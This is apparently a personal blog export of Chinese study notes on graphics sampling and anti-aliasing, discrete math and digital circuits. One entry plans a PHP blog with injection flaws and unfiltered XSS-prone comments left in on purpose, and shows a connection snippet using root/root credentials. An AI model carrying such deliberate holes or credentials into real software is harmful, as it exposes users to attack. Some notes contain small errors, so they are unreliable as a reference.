<p>一般来说, 图形学的采样有时间上的, 也有空间上的, 上节课讲的是空间上的</p>
<p>时间上的采样就是视频</p>
<p>因为视频不是连续的, 而是离散的每一帧构成的, 所以当采样速度过低时就会产生重影</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162157183.png" alt="" /><figcaption>image-20230416215757129</figcaption>
</figure>
<p>这里有一个专业术语 <strong>Artifacts</strong>, <strong>用以概括性描述图形学中所有不按照实际现实情况显示的图形缺陷</strong></p>
<p>摩尔纹也是一种artifact</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162159052.png" alt="" /><figcaption>image-20230416215936993</figcaption>
</figure>
<p>摩尔纹有两种成因</p>
<ol type="1">
<li>隔行扫描的显示设备上, 拍摄的某一瞬间, 只有奇数行或者偶数行被扫描出来了, 这导致图像所包含的像素少了一半, 但是图像大小不变, 所以产生了摩尔纹;这是一个成像设备去拍摄另一个成像设备过程中产生的</li>
<li>成像设备/拍摄设备为了显示/拍摄某些高密度花纹时, 对于显示设备/感光器而言, 这是一种高频信息(所谓高频就是变化率很快, 比如花纹的边界两边快速变化颜色) 当这种高频信号的频率与成像设备原件像素的空间频率相近的时候, 就可能导致某一行像素由于差拍原理(类似于干涉)无法被记录, 从而产生成因一, 像素变少了, 但是图像大小没变化, 这样就会让某些地方很空旷, 形成花纹</li>
</ol>
<p>学术一点的说法:</p>
<p>图形学中的摩尔纹是指在采样图像时，由采样序列与图像中信号的周期性或间隔性相互作用形成的一种视觉伪影。它们通常出现在采样频率接近或等于信号频率的情况下。</p>
<p>具体来说，摩尔纹的成因与<strong>采样定理</strong>(后面会讲)有关。根据采样定理，为了避免信号重建时出现失真，采样频率应该至少是信号最高频率的两倍(严格大于)。如果采样频率稍微低于两倍信号频率，就会产生一系列频谱镜像，其中一些镜像可能会重叠并与原始信号的谐波部分形成相互干扰。</p>
<p>从视觉角度来看，这些相互干扰可以在信号中形成周期性条纹或亮度变化，这就是摩尔纹的成因。当信号的周期长度与采样序列的间隔长度非常接近时，摩尔纹会变得尤为明显。</p>
<p>摩尔纹在数字摄影和计算机图像处理中很常见，对于理解图像采样和信号处理的基本原理非常重要。</p>
<p>再来一个时间采样artifact, 反向旋转的转盘</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162220745.png" alt="" /><figcaption>image-20230416222001661</figcaption>
</figure>
<p>那么这些东西的本质都是什么呢? 其实本质上都是原始数据信号变化率过大, 导致成像设备(采样设备)的采样率跟不上原始信号的变化率造成的</p>
<h3 id="采样前预处理">采样前预处理</h3>
<p>采样前做模糊的操作可以一定程度上缓解</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162222815.png" alt="" /><figcaption>image-20230416222232777</figcaption>
</figure>
<p>也就是说, 把二元离散信号转换成32位的离散信号</p>
<p>从布尔值转换为了浮点值, 虽然采样率没有直接变化,但是可以承载的信息更多了</p>
<p>效果图</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162223723.png" alt="" /><figcaption>处理前</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162224366.png" alt="" /><figcaption>处理后</figcaption>
</figure>
<h3 id="采样定理">采样定理</h3>
<p>信号的变化速率与频率有关:</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162226201.png" alt="" /><figcaption>image-20230416222620149</figcaption>
</figure>
<h4 id="频率的分解">频率的分解</h4>
<p>傅里叶展开可以用来写傅里叶变换<br />
</p>
<p>简而言之就是任何信号都可以写作一系列正弦波余弦波之和加上一个常数项</p>
<p>用于描述原始信号中, 各频率成分的信号的占比</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162229702.png" alt="" /><figcaption>image-20230416222942657</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162230521.png" alt="" /><figcaption>image-20230416223002482</figcaption>
</figure>
<p>我们可以把空域(空间)上的信号(图像)转换到频域上面, 形成一张频域图</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162231423.png" alt="" /><figcaption>image-20230416223126379</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162231341.png" alt="" /><figcaption>image-20230416223147275</figcaption>
</figure>
<p>频域图的中心意味着低频信号</p>
<p>频域图的外侧意味着高频信号, 高频信号也就是图像的边界</p>
<p>频域图的两条明亮的线不是坐标轴, 而是由于计算频域图时, 我们会把原始图像平铺, 这导致原始图像边界处形成了明显的一个竖向或横向的边界, 形成了频域图的两条明亮的线</p>
<p>采用低通高通和FFT的方法处理图像是比较古早的办法了, 现在一般是机器学习</p>
<h4 id="采样定理-1">采样定理</h4>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162232340.png" alt="" /><figcaption>image-20230416223233298</figcaption>
</figure>
<p>采样率需要严格大于原始频率两倍</p>
<p>否则就会有两个不同的信号, 采样结果相同, 造成<strong>混叠(Aliasing)</strong>, 是一种失真</p>
<h4 id="卷积">卷积</h4>
<p>卷积就是求几加权平均值</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162237605.png" alt="" /><figcaption>image-20230416223755568</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162238603.png" alt="" /><figcaption>image-20230416223810570</figcaption>
</figure>
<p>有一个信号矩阵和一个过滤器矩阵</p>
<p>另外, 时域的卷积等价于频域的乘积, <strong>这里的乘积指的是逐元素算数相乘, 而不是矩阵的乘法</strong></p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304171754440.png" alt="" /><figcaption>image-20230417175424346</figcaption>
</figure>
<p>傅里叶变化得到的频域图本质上是一种信息的压缩</p>
<p>一张全黑的图片和一张全白的图片的频域图本质上是相同的</p>
<p>参考下面的例子(左边是时域, 右边是频域)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304171808796.png" alt="" /><figcaption>image-20230417180803763</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304171808787.png" alt="" /><figcaption>image-20230417180818761</figcaption>
</figure>
<p>相同内容越少, 频域图的可视区域越大</p>
<p>相同内容越多, 频域图的可视区域越小</p>
<p><strong>也就是说, 时域的密集程度和频域的密集程度是相反的</strong></p>
<h3 id="有了前面的铺垫-采样到底是什么">有了前面的铺垫, 采样到底是什么</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304171818956.png" alt="" /><figcaption>image-20230417181824921</figcaption>
</figure>
<p>我们来看原始信号(a), 他经过傅里叶变换后转换到频域上(b), 可以看到原始信号中包含了 <span class="math inline">\([-f_0,f_0]\)</span> 上, 许多不同频率信号, 换句话来说, 原始信号等价于这个频率区间内各种不同信号的叠加, 各信号的强度不同</p>
<p>对于函数(c), 这是一个用于标记采样间隔的函数, 称之为<strong>冲激函数</strong>, 可以看出来, 冲激函数是一个周期函数, 当采样越密集的时候, 冲激函数的周期越小, <strong>频率越大</strong>, 反应到频域图上的结果就是, <span class="math inline">\(f_s\)</span>与 <span class="math inline">\(2f_s\)</span>之间的间隔变大(<strong>时域的密集程度和频域的密集程度是相反的</strong>)</p>
<p>对于图形(e) 它描述了(a)和(c)的卷积, 由于时域卷积相当于频域乘积, 我们把(d)和(b)相乘, 相当于(b)中的单一一个图形, 连续的向坐标轴两端复制, 当冲激函数的函数值为0时, 复制失败, 当冲激函数为true时, 完成一次复制判定, 所以我们看到了图像(f), 他描述的是采样结果, 也说明了, 采样结果的频域图像就是原始信号频域图像的不断复制、堆叠</p>
<p>当我们的冲激函数频率过低, 导致其在频域图像上 <span class="math inline">\(f_s\)</span>与 <span class="math inline">\(2f_s\)</span>之间的间隔过于小, 这将会导致上述的图像复制判定过程太过于密集, 产生了如下图像</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262156177.png" alt="" /><figcaption>image-20230417183011781</figcaption>
</figure>
<p>称之为<strong>混叠</strong>, 也就是说, 采样结果在频域上的图像发生了重合</p>
<h3 id="有了前面的铺垫-什么是反走样">有了前面的铺垫, 什么是反走样</h3>
<p>有两种普遍做法</p>
<p>第一种, 直接增大采样率(冲激函数频率增大), 但这个会增加计算开销</p>
<p>第二种, 正经的反走样算法, 如下所述</p>
<p>最普遍的传统操作(传统指的是不引入机器学习), 首先做一个模糊操作, 然后再采样</p>
<p><strong>我们这个模糊操作, 相当于删除了频域图上, 远离中心的高频信号,只保留低频信号(下面的图很直观)</strong></p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262155716.png" alt="" /><figcaption>image-20230426215010844</figcaption>
</figure>
<p>这样就不会发生混叠了(即使采样率较低)</p>
<p>也就是现实中的MSAA抗锯齿 也就是 多重采样<em>抗锯齿</em></p>
<h3 id="msaa抗锯齿">MSAA抗锯齿</h3>
<p>首先, 把连续的, 原本要映射到离散像素上的图片数据留着, 不要直接映射</p>
<p>我们先把这些数据映射到一个虚拟的屏幕上, 这个屏幕的每个像素都是由更多的像素点组成的</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262202231.png" alt="" /><figcaption>image-20230426220203189</figcaption>
</figure>
<p>下图是四倍采样</p>
<p>由于这些像素点实际上不会映射到硬件上的四倍像素上, 所以运算开销要比真实的四倍像素小得多, 比一倍像素的开销大不了多少, 因为这个只是一个判定问题, 模糊处理后, 数据不会在后续步骤中维持4x4的倍率, 而是维持原始分辨率的数据容量</p>
<p>模糊处理方式是: 判定一条斜线内涵了多少个子像素点, 含有的数量比例, 会被转换为一个比例值</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262205449.png" alt="" /><figcaption>image-20230426220539410</figcaption>
</figure>
<p>然后加起来子像素, 除以子像素总数, 就可以得到一个模糊的单一像素</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262206221.png" alt="" /><figcaption>image-20230426220616177</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304262206582.png" alt="" /><figcaption>image-20230426220630546</figcaption>
</figure>
<h3 id="其他">其他</h3>
<p>介绍了一下FXAA 和 TAA和超分辨率和超采样</p>
<h2 id="课外资料">课外资料</h2>
<p>卷积: https://www.bilibili.com/video/BV1Vd4y1e7pj</p>
<p>https://www.zhihu.com/question/22298352</p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记7 着色, 深度测试</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-7-xuan-ran-shen-du-huan-chong/</url>
    <content><![CDATA[
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>开发一个简单blog（无CSS实现；包含撰文，评论等多种功能）</title>
    <url>/cun-dang/my-blog/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>逆向太难了，学成傻逼了，果断转web</p>
<p>老话说的好，要想学安全，得先学开发，于是笔者思考了一下：</p>
<p>目前只会简单的js和html，那就开发一个纯后端（PHP+MySQL）的博客实现吧，这样就可以学习PHP和MySQL啦</p>
<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
<p>虽说笔者在开发这个项目前毫无后端经验，但是强烈建议读者至少学会PHP基础语法再看本文</p>
<h2 id="正文">正文</h2>
<p>本文主要是记录开发过程中遇到的一些问题，而非手把手教学</p>
<h3 id="环境">环境</h3>
<p>由于笔者开发机之前配过php和MySQL环境，现在的环境并不干净，尝试了各种解决办法之后依旧连接不上localhost（MySQL），最终使用phpstudy终于卸载干净了，然后依据菜鸟教程上面的方法配好了MySQL8.0环境</p>
<p>在这一过程中途还产生了连接远程服务器（也就是此博客的服务器）上面的数据库，但是在phpstorm里面连不上，不知道是哪里出了问题。。。（用户名密码正确，端口全放开了，数据库权限也放开了，SSH可以连上，没有挂任何正向代理或反向代理服务）</p>
<p>而在datagrip里面是可以正常连接的。。。</p>
<h3 id="开发构想">开发构想</h3>
<p>实现一个主页，主页当中有欢迎语和菜单栏，菜单栏指向文章编辑器，文章浏览页，个人资料页</p>
<p>其中，文章编辑器会故意留下安全性问题，便于后续注入测试</p>
<p>个人资料页提供修改密码功能，并会故意留下安全性问题，便于后续注入测试</p>
<p>文章浏览页会按照时间顺序显示所有文章的标题，并将标题超链接至对应地址</p>
<p>文章页包括文章主体内容和一个评论区，评论区内容不会做任何过滤，便于后续测试XSS注入</p>
<h3 id="开发过程遇到的问题">开发过程遇到的问题</h3>
<p>根据构想，许多页面的首要任务是连接数据库,然后读取或写入数据</p>
<p>根据代码复用原则创建文件<code>connectToDB.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 永远不写重复的代码</span><br><span class="line">$host=&#x27;localhost&#x27;;</span><br><span class="line">$user=&#x27;root&#x27;;</span><br><span class="line">$passwd=&#x27;root&#x27;;</span><br><span class="line">$dbname=&#x27;myblog&#x27;;</span><br><span class="line">$conn=mysqli_connect($host,$user,$passwd);</span><br></pre></td></tr></table></figure>
<p>然后在需要连接数据库的php页当中</p>
<p><code>include_once 'connectToDB.php'</code></p>
<p>然后复用<code>$conn</code>变量</p>
<p>但是实测发现跨php文件使用变量（即便是全局变量）是被禁止的，改为使用$_GLOBALS数组</p>
<p>顺便查了一下Session和Global的区别，下面这篇帖子说的非常一针见血，一看就懂</p>
<p>https://stackoverflow.com/questions/14848145/what-is-the-difference-between-session-variables-global-variables-in-php/14848246</p>
<h2 id="尾声">尾声</h2>
<p>这篇文章写道一半的时候重装电脑了,然后忘记备份这个博客的源码了.....</p>
<p>最终博客是全都开发完成的状态,可惜文章烂尾了</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>一些待研究底层原理的宏观现象</title>
    <url>/cun-dang/yi-xie-dai-yan-jiu-di-ceng-yuan-li-de-hong-guan-xian-xiang/</url>
    <content><![CDATA[<ul>
<li>_libc_start_main 在启动结束后rsi寄存器的指向为什么是PATH，或者说，该函数什么时候处理PATH
<ul>
<li>操作系统启动进程的函数处理的</li>
</ul></li>
<li>main的rbp是谁处理的
<ul>
<li>操作系统启动进程的函数处理的</li>
</ul></li>
<li>sparse和gcc的预处理器对attribute扩展的处理为什么是可忽略的
<ul>
<li>单纯是程序设计为一个可以开关的功能</li>
</ul></li>
<li>为什么允许用户态修改argc
<ul>
<li>因为argc已经是用户态接收的数据了</li>
</ul></li>
<li>fopen,open这些函数的真正区别是什么,为什么glibc里面的是fopen,CRT里面的是open
<ul>
<li>不同的开发方开发的两套功能类似的东西</li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>参考文献1 unix系统早期开发情况</title>
    <url>/cun-dang/can-kao-wen-xian-1/</url>
    <content><![CDATA[<p>https://www.read.seas.harvard.edu/~kohler/class/aosref/ritchie84evolution.pdf</p>
<p>unix系统早期状况(在某些方面较大程度上反映了当代微型Linux系统状况)</p>
<p>重点:P7 P10 P11</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>参考文献2 GCC常用参数 GDB常用指令</title>
    <url>/cun-dang/can-kao-wen-xian-2-gcc-chang-yong-can-shu/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172114295.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101532.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101944.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>参考文献3 MIPS白皮书 vol.2 chapter.3</title>
    <url>/cun-dang/can-kao-wen-xian-3-mips-bai-pi-shu-vol2/</url>
    <content><![CDATA[<p>https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol2.pdf</p>
<p>P39</p>
<p>P117</p>
<p>P123</p>
<p>P156</p>
<p>P166</p>
<p>P182</p>
<p>P255</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>参考文献4 MIPS平台下，是否存在多返回值的函数</title>
    <url>/cun-dang/can-kao-wen-xian-4-duo-fan-hui-zhi-de-han-shu/</url>
    <content><![CDATA[<p>https://stackoverflow.com/questions/19204430/when-do-we-need-v1-in-mips/24230036#24230036</p>
<p>https://stackoverflow.com/questions/20131986/why-mips-assembler-has-more-that-one-register-for-return-value</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>有没有可能同时点到Windows窗体程序的两个不同按钮？</title>
    <url>/cun-dang/you-mei-you-ke-neng-tong-shi-dian-dao-liang-ge-an-niu/</url>
    <content><![CDATA[<p>很小的时候使用电脑时就好奇过一个问题，我鼠标去点击一个位置，如果目标位置看起来和另一个按钮区域很贴合，为什么能够真正的所见所得？即：渲染的按钮位置很大，两个按钮很近，鼠标的点击位置虽然只是一个小尖尖，但有没有可能让这个小尖尖同时点到两个按钮？</p>
<p>并且为这个年幼时提出的问题补充一个后续：这种情况下的硬件中断事件是如何被消息处理器处理的？</p>
<h2 id="正文">正文</h2>
<p>Windows 为每个程序（严格地说是每个线程）维护一个消息队列，Windows 检查系统消息队列里消息的发生位置，当位置位于某个应用程序的窗口范围内的时候，就把这个消息派送到应用程序的消息队列里</p>
<p>另外参见WM_SETCURSOR文档</p>
<p>基本来说，这也解决了为什么程序可以做到：当鼠标快速在不同窗口之间来回游走时，快速切换鼠标样式（由程序控制的鼠标样式）</p>
<p>所以最前面的问题的答案是，不可能</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>转载一段话</title>
    <url>/cun-dang/zhuan-zai-yi-duan-hua/</url>
    <content><![CDATA[<p>由于过多的全局变量会影响程序的模块化结构，所以不要设置没必要的全局变量，尽量把变量定义成局部变量。 把仅在子程序中使用的变量设置为局部变量可以使子程序更容易封装成一个黑匣子，如果无法把全部变量设置为局部变量，则尽量把这些数据改为参数输入输出，如果无法改为参数， <strong>那么意味着这个子程序不能不经修改地直接放到别的程序中使用。</strong></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>(A+B)(A+C)=A+BC如何逆推</title>
    <url>/xue-xiao-nei-bi-ji/abacabc-ru-he-ni-tui/</url>
    <content><![CDATA[<p>(A+B)(A+C)<br />
=AA+AB+AC+BC<br />
=AA+A(B+C)+BC<br />
=A+A(B+C)+BC<br />
=A(1+B+C)+BC<br />
=A+BC</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>D触发器的使能端和清零端</title>
    <url>/xue-xiao-nei-bi-ji/d-hong-fa-qi-de-shi-neng-duan-he-qing-ling-duan/</url>
    <content><![CDATA[<h2 id="同步清零和异步清零">同步清零和异步清零</h2>
<p>这里的同步异步是相对于CLK而言的</p>
<p>同步的"同"是与CLK相同有效边沿信号频率</p>
<p>异步则是一旦有行为信号输入,则立刻产生对应行为,不等待下一次CLK</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050367.png" /></p>
<h2 id="使能端">使能端</h2>
<p>对于触发器而言，使能信号在整体逻辑上，相当于和CLK相与；但是实际上不会直接用与门处理，因为这样会减速，CLK信号可能会异步</p>
<p>与门可以理解为放行或者封锁</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050268.png" /></p>
<p>上述是好理解，但是错误的做法（尽量不要在CP信号线上增加任何逻辑运算元器件）</p>
<p>下述是正确做法，利用<strong>选择器</strong>，筛选信号，并把一路作为回馈信号</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057722.png" /></p>
<p>但只需要简单画为En引脚就行</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050237.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
      <tags>
        <tag>数电</tag>
        <tag>硬件</tag>
        <tag>校内笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微电路组合电路元件笔记</title>
    <url>/xue-xiao-nei-bi-ji/sr-suo-cun-qi/</url>
    <content><![CDATA[<h2 id="选择器">选择器</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116232.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116564.png" /></p>
<h2 id="译码器">译码器</h2>
<p>相当于排列组合,取某一位的真值</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115180.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116008.png" /></p>
<h2 id="sr锁存器">SR锁存器</h2>
<p>R,S极如果输入互斥或信号，则为设置储存内容</p>
<p>如果设置成功后,输入0,0两极信号，则内部存储时序电路信号</p>
<p>如果输入1,1两极信号，则UB</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053486.png" /></p>
<h2 id="d锁存器">D锁存器</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053592.png" /></p>
<p>SR锁存器前面加两个与门，E是enable端，D是data</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053654.png" /></p>
<p>当E为1，D（输入）和Q（输出）之间就好似透明的</p>
<h2 id="d触发器">D触发器</h2>
<p>CP信号(Clock Pulse)跳变瞬间变化，C1为时钟端（数字1），是clock的cl的异写</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053562.png" /></p>
<p>术语称为，有效沿触发</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053428.png" /></p>
<p>有效沿到来前称为现态，之后称为次态</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053466.png" /></p>
<p>两个D锁存器并联后与CLK串联</p>
<h2 id="锁存器和触发器的区别">锁存器和触发器的区别</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053420.png" /></p>
<h2 id="三态门">三态门</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053872.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053386.png" /></p>
<p>可以在一条总线上放多个元件而不会信号互扰</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>一些电路元件笔记</title>
    <url>/xue-xiao-nei-bi-ji/yi-xie-dian-lu-yuan-jian-bi-ji/</url>
    <content><![CDATA[<h2 id="并行加法器">并行加法器</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172111930.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>马尔科夫链笔记</title>
    <url>/xue-xiao-nei-bi-ji/shi-me-shi-ma-er-ke-fu-lian/</url>
    <content><![CDATA[<p>状态出口与状态保持的概率仅与当前状态有关，且与先前的任一状态均无关的状态机就是马尔科夫链</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>几个关系</title>
    <url>/xue-xiao-nei-bi-ji/ji-ge-guan-xi/</url>
    <content><![CDATA[<p>恒等关系I instant,主元素和副元素相同的关系</p>
<p>等价关系,同时满足自反传递对称的关系</p>
<p>自反:r(A) reflexive</p>
<p>对称:s(A) symmetric</p>
<p>传递:t(A) transferergodic</p>
<p>全域关系:经由cluster ergodic而形成的关系</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>化简等值式</title>
    <url>/xue-xiao-nei-bi-ji/hua-jian-deng-zhi-shi/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052727.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113097.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>寄存器和触发器</title>
    <url>/xue-xiao-nei-bi-ji/ji-cun-qi-he-hong-fa-qi/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113923.png" /></p>
<p>在逻辑上完全等价，应用场景略有不同</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113003.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>推理的相关公式</title>
    <url>/xue-xiao-nei-bi-ji/tui-li-de-xiang-guan-gong-shi/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172120694.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>时序电路的时间参数</title>
    <url>/xue-xiao-nei-bi-ji/shi-xu-dian-lu-de-shi-jian-can-shu/</url>
    <content><![CDATA[<h2 id="三大块">三大块</h2>
<p>建立时间，保持时间，内部延迟时间</p>
<p>setup time, hold time, clk-to-out propagation delay</p>
<h2 id="setup-time">setup time</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100087.png" /></p>
<p>注意D的不定值和稳定值 示意画法</p>
<h2 id="hold-time">hold time</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100580.png" /></p>
<h2 id="clk-to-out-propagation-delay">clk-to-out propagation delay</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100902.png" /></p>
<h2 id="时钟最大频率上限与元器件时间性能的关系">时钟最大频率上限与元器件时间性能的关系</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100368.png" /></p>
<p>例题</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101114.png" /></p>
<p>前例的注意点</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158312.png" /></p>
<p>对时间信号尽可能不要加逻辑门</p>
<p>时钟偏差↑</p>
<p>所有模块的最长周期决定了全局时钟周期</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101164.png" /></p>
<p>有点类似短板效应</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>析取式和合取式</title>
    <url>/xue-xiao-nei-bi-ji/xi-qu-shi-he-he-qu-shi/</url>
    <content><![CDATA[<ol type="1">
<li>文字：命题变元及其否定的总称，如P,Q,¬R等</li>
<li>简单析取式，简单合取式：由有限个文字构成的逻辑语句</li>
<li>析取范式，合取范式：由有限个简单<strong>合取式</strong>的<strong>析取</strong>构成的逻辑语句；由有限个简单<strong>析取式</strong>的<strong>合取</strong>构成的逻辑语句</li>
<li>极大项，极小项：命题变元或它的否定 之一恰好只出现一次，且下标从小到大排列的简单<strong>析取式</strong>；命题变元或它的否定 之一恰好只出现一次，且下标从小到大排列的简单<strong>合取式</strong></li>
<li>下标：使逻辑语句成立时，各个变量（按字母表顺序）的真值，以大端形式排列为二进制数，再转换为十进制数，这个十进制数就是下标</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172144430.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100245.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>离散数学连结词笔记</title>
    <url>/xue-xiao-nei-bi-ji/chi-san-shu-xue-lian-jie-ci-bi-ji/</url>
    <content><![CDATA[<p>①如果p那么q         　p-&gt;q;</p>
<p><strong>②只有p才q</strong> 　 <strong>q-&gt;p</strong>;(p是q的必要条件)(反的)</p>
<p>仔细想一下，只有p-&gt;q和q-&gt;p两种情况，p成立不一定q成立，而q成立，那么p就一定成立，所以后者正确；</p>
<p><strong>③只要p就q</strong>                 p-&gt;q;(p是q的充分条件)  同①</p>
<p>④仅当p, q   q-&gt;p(仅当不就是只有吗?)</p>
<p>⑤当且仅当p,q           q&lt;-&gt;p(充要条件，与==等价)</p>
<p>⑥除非p 否则 q         非p-&gt;非q/q-&gt;p</p>
<p>⑦除非p , q                  非p-&gt;q;</p>
<p>另外有逆否命题真值相同:</p>
<p>   非p-&gt;q 等价于 非q-&gt;p</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
